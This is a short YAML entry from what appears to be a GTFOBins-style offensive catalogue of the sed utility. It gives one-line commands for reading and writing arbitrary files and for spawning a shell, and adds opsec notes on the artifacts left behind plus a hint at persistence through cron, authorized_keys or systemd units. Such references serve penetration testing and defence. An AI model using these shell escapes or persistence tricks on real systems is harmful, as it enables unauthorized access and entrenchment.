---
name: sed
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: sed '' /path/to/input-file
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: sed -n '1e exec /bin/sh 1>&0' /etc/hosts
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: sed e
references:
- https://gtfobins.github.io/gtfobins/sed/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
